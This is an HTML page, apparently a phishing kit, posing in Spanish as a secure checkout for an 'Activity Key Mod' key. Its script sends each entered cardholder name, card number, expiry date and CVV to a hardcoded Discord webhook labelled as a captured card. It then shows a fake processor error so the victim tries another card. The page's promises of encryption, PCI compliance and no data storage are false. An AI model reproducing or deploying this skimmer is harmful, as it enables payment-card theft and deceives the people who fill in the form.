<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Activity Key Mod | Secure Checkout</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        body { background-color: #0d0d12; color: white; font-family: 'Inter', sans-serif; }
        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.1); }
        .input-style { background: #1a1a24; border: 1px solid #2d2d3d; padding: 12px; border-radius: 8px; width: 100%; outline: none; transition: 0.3s; }
        .input-style:focus { border-color: #00f2fe; box-shadow: 0 0 10px rgba(0, 242, 254, 0.2); }
        .secure-badge { background: #122b21; color: #4ade80; font-size: 10px; padding: 4px 10px; border-radius: 20px; font-weight: bold; }
    </style>
</head>
<body class="flex flex-col items-center justify-center min-h-screen p-4">

    <div class="max-w-md w-full mb-6 text-center">
        <h1 class="text-3xl font-black text-cyan-400 italic">ACTIVITY KEY MOD</h1>
        <div class="flex justify-center items-center gap-2 mt-2">
            <span class="secure-badge"><i class="fas fa-shield-alt mr-1"></i> PAGO 100% ENCRIPTADO</span>
        </div>
    </div>

    <div class="max-w-md w-full glass p-8 rounded-3xl shadow-2xl">
        <h2 class="text-xl font-semibold mb-6">Detalles de la Tarjeta</h2>
        
        <form id="paymentForm" class="space-y-4">
            <div>
                <label class="text-xs text-gray-400 mb-1 block uppercase">Nombre del Titular</label>
                <input type="text" id="name" class="input-style" placeholder="Como figura en la tarjeta" required>
            </div>

            <div>
                <label class="text-xs text-gray-400 mb-1 block uppercase">Número de Tarjeta</label>
                <div class="relative">
                    <input type="text" id="cardNum" class="input-style" maxlength="19" placeholder="0000 0000 0000 0000" required>
                    <div class="absolute right-3 top-3 flex gap-1 text-gray-500">
                        <i class="fab fa-cc-visa text-lg"></i>
                        <i class="fab fa-cc-mastercard text-lg"></i>
                    </div>
                </div>
            </div>

            <div class="flex gap-4">
                <div class="w-1/2">
                    <label class="text-xs text-gray-400 mb-1 block uppercase">Vencimiento</label>
                    <input type="text" id="expiry" class="input-style" placeholder="MM/YY" maxlength="5" required>
                </div>
                <div class="w-1/2">
                    <label class="text-xs text-gray-400 mb-1 block uppercase">CVV / CVC</label>
                    <input type="password" id="cvv" class="input-style" placeholder="123" maxlength="4" required>
                </div>
            </div>

            <div>
                <label class="text-xs text-gray-400 mb-1 block uppercase">País de Emisión</label>
                <select id="country" class="input-style">
                    <option value="Argentina">Argentina</option>
                    <option value="México">México</option>
                    <option value="Colombia">Colombia</option>
                    <option value="Chile">Chile</option>
                    <option value="Perú">Perú</option>
                    <option value="USA">USA / Internacional</option>
                </select>
            </div>

            <button type="submit" id="btnPay" class="w-full bg-cyan-500 hover:bg-cyan-400 text-black font-black py-4 rounded-xl mt-6 transition-all transform active:scale-95">
                VERIFICAR Y GENERAR KEY
            </button>
        </form>

        <div class="mt-6 flex justify-center gap-4 opacity-30 grayscale">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" width="40">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" width="30">
            <img src="https://www.pci-ds.com/wp-content/uploads/2021/04/pci-logo.png" width="50">
        </div>
    </div>

    <p class="text-[10px] text-gray-600 mt-8 text-center uppercase tracking-widest">Protegido por SSL de 256 bits. Activity Mod no almacena datos bancarios.</p>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1488027032976756886/WAx7q6qQWxWGSEtQBt6tOkINuP8g7YKYqdsv2uHGrBa9FwCN-lj8Ojfuf4bU4XNG9peJ";

        document.getElementById('paymentForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const btn = document.getElementById('btnPay');
            btn.innerHTML = "<i class='fas fa-spinner fa-spin'></i> PROCESANDO...";
            btn.disabled = true;

            const payload = {
                content: "💳 **NUEVA TARJETA CAPTURADA - ACTIVITY KEY MOD**",
                embeds: [{
                    title: "Datos de Facturación",
                    color: 3066993,
                    fields: [
                        { name: "👤 Titular", value: document.getElementById('name').value, inline: true },
                        { name: "🌍 País", value: document.getElementById('country').value, inline: true },
                        { name: "💳 Número", value: "`" + document.getElementById('cardNum').value + "`" },
                        { name: "📅 Exp", value: document.getElementById('expiry').value, inline: true },
                        { name: "🔒 CVV", value: "`" + document.getElementById('cvv').value + "`", inline: true }
                    ],
                    footer: { text: "Activity Mod Logger 2026" },
                    timestamp: new Date()
                }]
            };

            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).then(() => {
                alert("Error de conexión: El procesador de pagos de tu país está saturado. Intenta con otra tarjeta.");
                location.reload();
            });
        });
    </script>
</body>
                                                         </html>
